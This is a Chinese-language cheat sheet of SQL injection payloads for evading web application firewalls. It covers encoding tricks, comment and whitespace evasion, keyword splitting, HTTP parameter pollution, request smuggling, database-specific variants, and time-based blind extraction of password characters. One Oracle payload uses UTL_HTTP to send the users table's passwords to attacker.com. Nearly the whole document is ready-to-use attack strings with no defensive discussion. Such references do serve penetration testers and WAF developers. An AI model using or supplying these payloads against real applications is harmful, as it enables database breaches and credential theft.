# SQL 注入 WAF 绕过技术

## 编码绕过

### URL 编码

```
# 单重编码
%27%20OR%201%3D1--
%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--

# 双重编码
%2527%2520OR%25201%253D1--
%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--

# 混合编码
%27%20%4fR%201%3D1--
```

### Unicode 编码

```
# Unicode 编码字符
\u0027 OR 1=1--
%u0027 OR 1=1--

# 宽字节注入 (GBK编码)
%df%27 OR 1=1--
%bf%27 OR 1=1--
%5c%27 OR 1=1--
```

### Base64 编码

```
# Base64 编码注入语句
JyBPUiAxPTEtLQ==   # ' OR 1=1--

# 使用 base64 函数
' UNION SELECT TO_BASE64(password) FROM users--
```

### Hex 编码

```sql
# 十六进制字符串
' UNION SELECT 0x74657374--
' UNION SELECT UNHEX('74657374')--
' UNION SELECT CONCAT(0x74657374)--

# 使用 hex 函数提取数据
' UNION SELECT HEX(password) FROM users--
```

## 注释绕过

### SQL 注释

```sql
# MySQL
'/**/OR/**/1=1--
'/*!50000OR*/1=1--
'/*!OR*/1=1--

# 内联注释版本检测
'/*!50000UNION*//*!50000SELECT*/1,2,3--

# 条件执行
'/*!50000IF(1=1,1,0)*/--
```

### 空白字符

```sql
# 各种空白字符替代空格
'%09OR%091=1--    # Tab
'%0AOR%0A1=1--    # 换行
'%0DOR%0D1=1--    # 回车
'%0COR%0C1=1--    # 换页
'%0BOR%0B1=1--    # 垂直制表符
'%A0OR%A01=1--    # 不间断空格

# MySQL 特有
'%00OR%001=1--    # Null字节
```

## 函数替代绕过

### 字符串函数

```sql
# CONCAT 替代
CONCAT('a','b') -> 'a'||'b' -> CONCAT_WS('','a','b')

# SUBSTRING 替代
SUBSTRING(str,1,1) -> MID(str,1,1) -> LEFT(str,1) -> RIGHT(str,1)

# 字符串比较
= -> LIKE -> IN -> REGEXP -> RLIKE -> BETWEEN

# 条件判断
IF(a,b,c) -> CASE WHEN a THEN b ELSE c END
IFNULL(a,b) -> COALESCE(a,b) -> NULLIF(a,b)
```

### 等价函数

```sql
# 获取版本
VERSION() -> @@VERSION -> @@GLOBAL.VERSION

# 获取用户
USER() -> CURRENT_USER() -> SESSION_USER() -> SYSTEM_USER()

# 获取数据库
DATABASE() -> SCHEMA()

# 字符串长度
LENGTH() -> CHAR_LENGTH() -> BIT_LENGTH() -> OCTET_LENGTH()
```

## 关键词绕过

### 大小写混合

```sql
SeLeCt * FrOm users
uNiOn SeLeCt 1,2,3
OrDeR By 1

# 双写绕过
SELSELECTECT
UNUNIONION
ANANDD
```

### 拼接绕过

```sql
# 字符串拼接
' OR '1'='1' -> ' OR '1'||'1'='11
' OR 1=1 -> ' OR 1=CONCAT(1)

# 函数拼接
EXEC('SEL'+'ECT * FR'+'OM users')
' OR 1=1 -> ' OR CONCAT('1','=','1')

# 变量拼接 (MySQL)
SET @a='SEL'; SET @b='ECT'; PREPARE stmt FROM CONCAT(@a,@b);
EXECUTE stmt;
```

### 编码函数

```sql
# CHAR 函数构建字符串
CHAR(83,69,76,69,67,84) -> SELECT

# 使用 CONCAT 和 CHAR
CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84))

# MySQL ELT 函数
ELT(1,'SELECT','INSERT','UPDATE')
```

## HTTP 层绕过

### 参数污染

```
# HPP (HTTP Parameter Pollution)
?id=1&id=' OR 1=1--
?id=1;&id=' OR 1=1--

# 不同服务器处理方式
# PHP/Apache: 取最后一个值
# ASP.NET/IIS: 取所有值，逗号连接
# Python/Flask: 取第一个值
```

### 分块传输

```
POST /api HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

3
'id
3
=1'
0
```

### HTTP 请求走私

```
# CL.TE 漏洞
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### X-Forwarded-For 绕过

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 127.0.0.1
X-Forwarded-Host: localhost
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

## 特定数据库绕过

### MySQL

```sql
# 科学计数法
' OR 1e0=1e0--

# MySQL 8 新特性
' UNION SELECT 1 TABLE information_schema.tables--

# 省略 FROM (MySQL)
SELECT 1; SELECT 2; SELECT 3

# 反引号
SELECT `column` FROM `table`
```

### PostgreSQL

```sql
# 类型转换
' OR 1::int=1--
' UNION SELECT 1::text--

# Dollar quoting
' UNION SELECT $$test$$--
' UNION SELECT $tag$test$tag$--

# Dollar quoting 函数
CREATE OR REPLACE FUNCTION test() RETURNS text AS $body$SELECT 'test'$body$ LANGUAGE SQL;
```

### MSSQL

```sql
# 类型转换
' OR 1=CAST(1 AS INT)--

# N 前缀 (Unicode)
SELECT N'test' FROM N'table'

# TOP 关键字
SELECT TOP 1 * FROM users--
```

### Oracle

```sql
# XML 函数
' UNION SELECT XMLTYPE('<x>'||(SELECT password FROM users WHERE rownum=1)||'</x>') FROM dual--

# UTL_HTTP 外带
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?d='||(SELECT password FROM users)) FROM dual--

# DBMS_XMLGEN
' UNION SELECT DBMS_XMLGEN.GETXML('SELECT password FROM users') FROM dual--
```

## 时间盲注优化

### 精确延时

```sql
# MySQL
' AND SLEEP(5)--
' AND BENCHMARK(5000000,SHA1('test'))--

# PostgreSQL
' AND pg_sleep(5)--
' AND (SELECT pg_sleep(5))--

# MSSQL
' WAITFOR DELAY '0:0:5'--

# Oracle
' AND DBMS_LOCK.SLEEP(5)=1--
' AND (SELECT COUNT(*) FROM ALL_USERS A, ALL_USERS B, ALL_USERS C WHERE ROWNUM<=1)>0--
```

### 条件延时

```sql
# MySQL
' AND IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--

# PostgreSQL
' AND CASE WHEN ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>64 THEN pg_sleep(5) ELSE pg_sleep(0) END--

# MSSQL
' IF ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>64 WAITFOR DELAY '0:0:5'--
```